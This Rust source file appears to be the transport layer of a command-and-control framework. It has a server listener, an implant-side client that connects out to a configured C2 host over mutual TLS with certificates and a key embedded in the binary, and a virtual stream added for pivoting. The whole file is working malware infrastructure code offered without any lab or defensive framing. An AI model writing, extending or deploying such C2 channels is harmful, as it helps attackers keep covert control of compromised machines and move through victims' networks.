use tokio::net::{TcpListener, TcpStream};
use tokio_rustls::{TlsAcceptor, TlsConnector, server::TlsStream as ServerTls, client::TlsStream as ClientTls};
use tokio::io::{AsyncRead, AsyncWrite, ReadBuf, DuplexStream};
use std::sync::Arc;
use std::net::SocketAddr;
use std::io;
use std::pin::Pin;
use std::task::{Context, Poll};

use crate::common::{C2Config, TransportProtocol};
use crate::pki;

// [FIX] Concrete Enum instead of Box<dyn Trait>.
// This guarantees the type is Send + Sync because all variants are.
pub enum C2Stream {
    Tcp(TcpStream),
    TlsServer(ServerTls<TcpStream>),
    TlsClient(ClientTls<TcpStream>),
    Virtual(DuplexStream), // [FIX] Added for Pivoting
}

// Forward AsyncRead
impl AsyncRead for C2Stream {
    fn poll_read(self: Pin<&mut Self>, cx: &mut Context<'_>, buf: &mut ReadBuf<'_>) -> Poll<io::Result<()>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_read(cx, buf),
            C2Stream::TlsServer(s) => Pin::new(s).poll_read(cx, buf),
            C2Stream::TlsClient(s) => Pin::new(s).poll_read(cx, buf),
            C2Stream::Virtual(s) => Pin::new(s).poll_read(cx, buf),
        }
    }
}

// Forward AsyncWrite
impl AsyncWrite for C2Stream {
    fn poll_write(self: Pin<&mut Self>, cx: &mut Context<'_>, buf: &[u8]) -> Poll<io::Result<usize>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_write(cx, buf),
            C2Stream::TlsServer(s) => Pin::new(s).poll_write(cx, buf),
            C2Stream::TlsClient(s) => Pin::new(s).poll_write(cx, buf),
            C2Stream::Virtual(s) => Pin::new(s).poll_write(cx, buf),
        }
    }

    fn poll_flush(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_flush(cx),
            C2Stream::TlsServer(s) => Pin::new(s).poll_flush(cx),
            C2Stream::TlsClient(s) => Pin::new(s).poll_flush(cx),
            C2Stream::Virtual(s) => Pin::new(s).poll_flush(cx),
        }
    }

    fn poll_shutdown(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<io::Result<()>> {
        match self.get_mut() {
            C2Stream::Tcp(s) => Pin::new(s).poll_shutdown(cx),
            C2Stream::TlsServer(s) => Pin::new(s).poll_shutdown(cx),
            C2Stream::TlsClient(s) => Pin::new(s).poll_shutdown(cx),
            C2Stream::Virtual(s) => Pin::new(s).poll_shutdown(cx),
        }
    }
}

// We don't need BoxedStream anymore, just use C2Stream directly.
pub type BoxedStream = C2Stream;

// --- SERVER SIDE ---

pub struct ServerTransport {
    protocol: TransportProtocol,
    listener: TcpListener,
    tls_acceptor: Option<TlsAcceptor>,
}

impl ServerTransport {
    pub async fn bind(config: &C2Config, cert: &[u8], key: &[u8], ca: &[u8]) -> io::Result<Self> {
        let addr = format!("0.0.0.0:{}", config.tunnel_port); 
        let listener = TcpListener::bind(&addr).await?;
        
        let tls_acceptor = if config.transport == TransportProtocol::Tls {
            let tls_config = pki::create_server_config(cert, key, ca)
                .map_err(|e| io::Error::new(io::ErrorKind::Other, e.to_string()))?;
            Some(TlsAcceptor::from(Arc::new(tls_config)))
        } else {
            None
        };

        Ok(Self {
            protocol: config.transport.clone(),
            listener,
            tls_acceptor,
        })
    }

    pub async fn accept(&self) -> io::Result<(C2Stream, SocketAddr)> {
        let (stream, peer_addr) = self.listener.accept().await?;

        match self.protocol {
            TransportProtocol::Tls => {
                if let Some(acceptor) = &self.tls_acceptor {
                    let tls_stream = acceptor.accept(stream).await?;
                    Ok((C2Stream::TlsServer(tls_stream), peer_addr))
                } else {
                    Err(io::Error::new(io::ErrorKind::Other, "TLS Config Missing"))
                }
            },
            TransportProtocol::TcpPlain => {
                Ok((C2Stream::Tcp(stream), peer_addr))
            }
        }
    }
}

// --- CLIENT SIDE ---

pub struct ClientTransport {
    protocol: TransportProtocol,
    target_addr: String,
    tls_connector: Option<TlsConnector>,
}

impl ClientTransport {
    pub fn new(config: &C2Config) -> Self {
        let tls_connector = if config.transport == TransportProtocol::Tls {
            let ca = include_bytes!("../certs/ca.crt");
            let client_cert = include_bytes!("../certs/client.crt");
            let client_key = include_bytes!("../certs/client.key.der");
            
            if let Ok(cfg) = pki::create_client_config(ca, client_cert, client_key) {
                Some(TlsConnector::from(Arc::new(cfg)))
            } else {
                None 
            }
        } else {
            None
        };

        Self {
            protocol: config.transport.clone(),
            target_addr: format!("{}:{}", config.c2_host, config.tunnel_port),
            tls_connector,
        }
    }

    pub async fn connect(&self) -> io::Result<C2Stream> {
        let stream = TcpStream::connect(&self.target_addr).await?;

        match self.protocol {
            TransportProtocol::Tls => {
                if let Some(connector) = &self.tls_connector {
                    let domain = tokio_rustls::rustls::ServerName::try_from("localhost")
                        .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "Invalid DNS"))?;
                    
                    let tls_stream = connector.connect(domain, stream).await?;
                    Ok(C2Stream::TlsClient(tls_stream))
                } else {
                    Err(io::Error::new(io::ErrorKind::Other, "TLS Init Failed"))
                }
            },
            TransportProtocol::TcpPlain => {
                Ok(C2Stream::Tcp(stream))
            }
        }
    }
}
